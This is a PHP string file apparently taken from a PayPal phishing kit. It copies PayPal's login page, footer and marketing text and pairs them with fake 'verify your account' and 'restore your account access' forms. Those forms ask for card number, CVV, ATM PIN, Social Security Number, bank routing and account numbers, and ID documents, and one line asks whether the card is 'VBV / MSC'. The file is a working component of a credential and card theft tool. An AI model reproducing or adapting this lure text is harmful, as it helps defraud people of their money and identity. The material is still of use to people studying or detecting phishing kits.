<?php 


$confirmbutton = "Confirm";
$confirmyourinfo = "You need to confirm your informations to be able to fix this problem and access to your account";
$unabletoload = "Temporarily unable to load your account.";

$confirm = "Confirm your Account Use it however you like";
$topp = "Your security is our top priority";
$secondarycred = "Secondary Credit Card (optional)";
$primarycred = "Primary Credit Card";
$thiscardis = "This Card is VBV / MSC";

$wrong = "Some information you entered isn't right.";
$titlerr = "Error - Login ";
$section_n1 = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent_ = true;
$section_row_fluid_panel_blue_reverseLink = true;
$section_row_fluid_editorial_editorial_left_ = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n4_ = true;
$section_row_fluid_panel_light_center_text = true;
$small_with_helper_input_0 = "A valid email address is required";
$small_with_helper_input_1 = "Password is required";
$login_email_input_0 = "Email address";
$passwordRecovery1_a_0 = "Forgot your email address?";
$login_password_input_0 = "Password";
$passwordRecovery2_a_0 = "Forgot password?";
$login_button_a_0 = "Log In";
$signup_button_a_0 = "Sign Up";
$header_buy_a_0 = "Buy";
$header_sell_a_0 = "Sell";
$header_send_a_0 = "Send";
$header_business_a_0 = "Business";
$signup_button_inner_a_0 = "Sign Up";
$hero_h1_0 = "Less time paying, more time playing";
$SignUp_consumer_hero_input_0 = "Sign up for free";
$signup_subline_p_0 = "Do you have an enterprise? Open a Business Account";
$icon_help_a_0 = "Help";
$icon_contact_a_0 = "Contact";
$icon_search_button_0 = "Search";
$_large_h2_n1_0 = "Want it, get it.";
$_large_h2_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0 = "Tap into your money.";
$_large_h2_row_fluid_editorial_editorial_left__0 = "You're so accepting.";
$_large_h2_row_fluid_editorial_editorial_right_editorial_bg_n4__0 = "We're there for you in person.";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_0 = "Send all over the place.";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_1 = "Request payment easily.";
$contentPara_p_n1_0 = "Millions of people use PayPal at thousands of shops. Just an email address and password, or mobile number and PIN, will get you through checkout before you can reach for your wallet. Couldn’t be simpler! ";
$contentPara_p_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0 = "You can use our app to pay the bill, pay at the till or pay a mate, just as you would online. No queues, no hassle. Just a simple, safer way to pay when you’re out and about. ";
$contentPara_p_row_fluid_panel_blue_reverseLink_0 = "Send money to almost anyone in the world with an email address or mobile number in an instant. No matter where they are, they’ll be delighted to get your message. ";
$contentPara_p_row_fluid_panel_blue_reverseLink_1 = "Requesting money with PayPal is a friendly reminder for a job well done. They’ll get an invitation to pay any way they like without having to think about it. ";
$contentPara_p_row_fluid_editorial_editorial_left__0 = "Start accepting debit and credit cards, linked bank accounts and PayPal balances. We've worked it all out for you, from sales to figures. It's so simple, it runs itself. ";
$contentPara_p_row_fluid_editorial_editorial_right_editorial_bg_n4__0 = "You can use our PayPal Here app and point of sale solutions to accept cards, cash and PayPal, anywhere you do business. ";
$contentLink_a_n1_0 = "Pay on eBay";
$contentLink_a_n1_1 = "Pay on websites";
$contentLink_a_row_fluid_panel_blue_reverseLink_0 = "Send money";
$contentLink_a_row_fluid_panel_blue_reverseLink_1 = "Request money";
$contentLink_a_row_fluid_editorial_editorial_left__0 = "Get paid on your website";
$contentLink_a_row_fluid_editorial_editorial_left__1 = "Email an invoice";
$contentLink_a_row_fluid_editorial_editorial_right_editorial_bg_n4__0 = "Get paid on the go";
$contentLink_a_row_fluid_editorial_editorial_right_editorial_bg_n4__1 = "Get paid in your store";
$contentLink_reverseLink_a_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0 = "Pay instore";
$contentLink_reverseLink_a_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__1 = "Pay on the go";
$closingHeadline_headline_large_p_0 = "Make money make sense. ";
$btn_closing_cta_center_block_span4_a_0 = "Get Started";
$footer_footer_main_secondaryLink_li = array();
$footer_footer_main_secondaryLink_li[0] = "Help";
$footer_footer_main_secondaryLink_li[1] = "Contact";
$footer_footer_main_secondaryLink_li[2] = "Fees";
$footer_footer_main_secondaryLink_li[3] = "Security";
$footer_footer_main_secondaryLink_li[4] = "Features";
$footer_footer_main_secondaryLink_li[5] = "Shop";
$footer_footer_secondary_secondaryLink_li = array();
$footer_footer_secondary_secondaryLink_li[0] = "About";
$footer_footer_secondary_secondaryLink_li[1] = "Blog";
$footer_footer_secondary_secondaryLink_li[2] = "Jobs";
$footer_footer_secondary_secondaryLink_li[3] = "Sitemap";
$footer_footer_secondary_secondaryLink_li[4] = "eBay";
$footer_footer_secondary_secondaryLink_li[5] = "Developers";
$footer_footer_secondary_secondaryLink_li[6] = "Enterprise";
$footer_footer_secondary_secondaryLink_li[7] = "Partners";
$footer_footer_secondary_secondaryLink_li[8] = "Feedback";
$footer_footer_tertiary_secondaryLink_li = array();
$copy1 = "Copyright © 1999-".$copyright." ";
$copy2 = "All rights reserved.";
$footer_footer_tertiary_secondaryLink_li[1] = "Privacy";
$footer_footer_tertiary_secondaryLink_li[2] = "Legal";

$top_title2 = "Error -  Login - PayPal";
$alert_alert_warning_div_0 = "You must enter both your email address and password. Please try again.";
$loginheadline_p_0 = "Log in to your account";
$error_span_0 = "Email address";
$error_span_1 = "Password";
$btn_large_input_0 = "Log In";
$pwrLinkoldflow_a_0 = "Forgot your email address or password?";
$btn_btn_secondary_large_a_0 = "Sign Up for Free";
$headline_p_0 = "All in one pay..<SPAN class=headline-content>Pick a card, any card, or bank account, or even apply to get a line of credit from us. It's your money, you choose how to spend it.</SPAN>";
$headline_p_1 = "Simple. And usually free.<SPAN class=headline-content>It's free to sign up for a PayPal account, and we don't charge you a transaction fee when you buy something, no matter how you choose to pay.</SPAN>";
$footer_li_footer_li = array();
$footer_li_footer_li[0] = "About PayPal";
$footer_li_footer_li[1] = "Contact Us";
$footer_li_footer_li[2] = "Fees";
$footer_li_footer_li[3] = "PayPal Developers";
$footer_li_footer_li[4] = "Merchant Services";
$footer_li_footer_li[5] = "Worldwide";
$footer_li_footer_li[6] = "Site Feedback";

$legal_p_0 = "Copyright © 1999-".$copyright." PayPal. Tous droits réservés.";

$charset = "UTF-8";
$profupdate = "Profile Update - PayPal";
$processing = "Logging you in securely";
$opay = "Logging in - PayPal";
$ifno = "If this page appears for more than 5 seconds,";
$clickhere = "click here";
$reload = "to reload.";
$logout = "Log Out";
$help = "Help";
$s_center = "Security and Protection";
$myacc = "My Account";
$over = "Overview";
$addfound = "Add Funds";
$retirar = "Withdraw";
$banktf = "Transfer to Bank Account";
$history = "History";
$bsearch = "Basic Search";
$dhistory = "Download History";
$resolu = "Resolution Centre";
$opencase = "View Open Cases";
$guides = "Guides";
$prof = "Profile";
$addemail = "Add or Edit Email";
$addbank = "Add or Edit Bank Account";
$addcard = "Add or Edit Credit Card";
$addadr = "Add or Edit Postal Address";
$sendmoney = "Send Money";
$reqmoney = "Request Money";
$mservices = "Merchant Services";
$autools = "Auction Tools";
$stra = "Secure Transaction";
$puf = "Profile Update";
$pip = "Personal Information Profile";
$acu = "Enter your information as accurately as possible.";
$accu = "Make sure you enter the information accurately, and according to the formats required.";
$filla = "Fill in all the required fields.";
$rfield = "Required Field";

$ffPrenom = "First name ";
$ffNom = "Last name ";

$dateness = "Date of Birth ";
$month = "Month";
$day = "Day"; 
$year = "Year";

$adr1 = "Address Line 1 ";
$adr2 = "Address Line 2 ";
$city = "City ";
$state = "State ";
$zip = "Zip Code ";
$country = "Country ";
$scountry = "--Select Country--";
$hpn = "Home Phone Number ";
$acpnum = "This number will be used to contact you about Security Measures and/or other issues regarding your PayPal account.";

$ccprof = "Credit/Debit Card Profile";
$damelacc = "Enter card information as accurately as possible.";
$damelacb = "For card number, enter numbers only please, no dashes or spaces.";

$Nomdutitulairedelacarte = "Name of cardholder";
//$Nomdutitulairedelacarte = "Card Name ";
$ccnumbr = "Card Number";
$expbr = "Expiration Date";
$cvv = "Card Verification Number";
$hcvv = "Help finding your Card Verification Number";
$atmm = "Your ATM PIN";
$ssn = "Social Security Number";
$routing="Bank Routing Number";
$account="Bank Account Number";
$hrouting="Help finding your Bank Routing Number";
$haccount="Help finding your Bank Account Number";
$codepersonel="Secure code";

$IDTYPE = "Select type of Id";
$Passport="Passport";
$Card_Identification="Card of Identification";
$Driving_License="Driving License";

$for1 = "For your protection, we verify credit card information.";
$for2 = "The process normally takes about 30 seconds, but it may take longer during certain times of the day. Please click";
$for3 = "to update your information.";
$spo = "Save Profile";

$t1 = "More Information";
$t2 = "About Us";
$t3 = "Site Feedback";
$t4 = "Fees";
$t5 = "Privacy";
$t6 = "Security Center";
$t7 = "Contact Us";
$t8 = "Legal Agreements";
$t9 = "Worldwide";
$t10 = "Jobs";
$t11 = "Merchant Services";
$t12 = "Our Blog";
$t13 = "Labs";
$t14 = "Referrals";
$t15 = "Site Map";
$t16 = "eBay";
$t17 = "Community";
$fdic = "Information about FDIC pass-through insurance";


$myvar3 = "Please complete the form below to update your Profile information and restore your account access. ";
$completeform = '<div id="messageBox" class="legacyErrors"><div class="messageBox error"><p style="width: 690px; margin-bottom: 6px; margin-top: 12px;">'.$myvar3.'</p></div></div>';


$valid = array("Please enter your first name"
,"Invalid First Name" //--------
,"Please enter your Last name"
,"Invalid Last Name" //--------
,"Please select a valid birth month." //--------4
,"Please select a valid birthday." //--------
,"Please select a valid birth year." //--------
,"Please enter your address"
,"Invalid address" //--------8
,"Invalid address" //--------
,"Please enter the name of your city"
,"Please enter a valid City name." //--------
,"Please enter a valid City name." //--------12
,"Select Country"
,"Please enter your ZIP code"
,"Invalid Zip Code." //--------15
,"Please enter your Telephone number"
,"Enter only the number"
,"Please enter a valid Phone Number" //--------
,"Please enter a valid name of cardholder" //--------19
,"Card number is in invalid format"  ////--------
,"Credit card number is invalid"  //--------
,""//--------22
,""//--------
,"Enter only the number"
,"Please select the Expiration Date --Month--"
,"Please select the Expiration Date --Year--"
,"Please enter your Cvv"
,"Please enter a valid Cvv/Cvv2 for your card."//--------
,"Invalid Cvv/Cvv2" //--------29
,"Please enter your ATM PIN"
,"Please enter a Valid ATM PIN" //--------
,"Please enter a Valid ATM PIN" //--------
,"Please enter your Social Security Number"
,"Invalid social security number."
,"Invalid social security number."
,"The Social Security Number only the number"
,"Please enter your Secure Code"
,"Invalid Secure Code");
$allcountry1 = "We get where you’re coming from.";
$allcountry2 = "We are available in 193 markets and 26 currencies. Spend and receive safely over borders and language barriers. We’re here for you, wherever you are. ";
$One_moment = "One moment ...";




$your_money = "Get more from your money";
$your_money_p = "Your PayPal account gives you a safer, faster and more convenient way to pay online and on your mobile. Store your financial details securely with us then use your account to shop, transfer money or sell your stuff to make some extra money – all in just a few clicks.";
$websites = "Shop at millions of websites";
$websites_p = "PayPal is available on millions of websites all over the world. So whether you're buying from the biggest retailers or the smallest specialists, you can shop without sharing your details and speed through checkout. And whichever device you're using, your PayPal experience will be just as fast and convenient.";
$Simply_secure = "Simply secure";
$Simply_secure_p = "Security is at the heart of everything we do. Whether it's protecting your financial details or your purchases, we put your security and peace of mind first. That's why we use leading encryption and anti-fraud technology, why we monitor transactions 24 hours a day and why we can help you get your money back if your purchase doesn't arrive or doesn't match its description.";

$ex_date_info = "Please give us your card expiration date (MM/YYYY).";
$ex_date_empty = "Please give us your card expiration date.";
$ex_date_format = "Please enter a valid expiration date (MM/YYYY). ";

$cardholder_info = "Use your name as shown on your card";
$card_info = "Enter your card number";
$card_format = "Card number is invalid";

$atm_info = "Enter the atm pin for this card.";

$account_info = "Enter your bank account number";
$account_empty = "Please Enter your bank account number to verify your account";
$account_format = "Please Enter a valid bank account number";

$routing_info = "Enter your bank routing number";
$routing_empty = "Please Enter your bank routing number to verify your account";
$routing_format = "Please Enter a valid bank routing number";

$first_name = "Your first name";
$first_name_info = "Use your legal first name as shown on your driver's licence, National Insurance card or passport.";
$first_name_empty = "We need your legal first name to verify your account.";

$last_name = "Your last name";
$last_name_info = "Use your legal last name as shown on your driver's licence, National Insurance card or passport.";
$last_name_empty = "We need your legal last name to verify your account.";

$Birth_date = "Date of Birth";
$Birth_date_empty ="Please give us your date of birth.";
$Birth_date_format = "Please enter a valid date (DD/MM/YYYY).";
$Birth_date_info = "Please give us your date of birth (DD/MM/YYYY).";

$Address1 = "Address line 1";
$Address1_empty = "We need a valid address to verify your account.";
$Address1_info = "We can't accept PO Boxes or business addresses.";

$Address2 = "Address line 2";

$City = "City";
$City_empty = "We need a town/city to verify your account.";

$Postcode = "Postcode";
$Postcode_empty = "We need a postcode to create a new account for you.";
$Postcode_format = "Please check your postcode for typos, the format doesn't look right.";

$fone = "Your phone number";
$fone_empty = "We need your phone number to verify your account.";
$fone_format = "Please check your phone number for typos, the format doesn't look right.";
$fone_info = "Your phone number (please use digits only)";

$verifyaccount = "Verify your account";
$Ownb = "Own a business?";

$hh1 = "Your secure details";
$hh2 = "Your personal details";

$pp1 = "We need your valid secure details to verify your account.";
$pp2 = "We need some information about you before we can verify your account.";

$type1="Home";
$type2="Mobile";
$button_continue="Continue";
$button_validate="Verify";

?>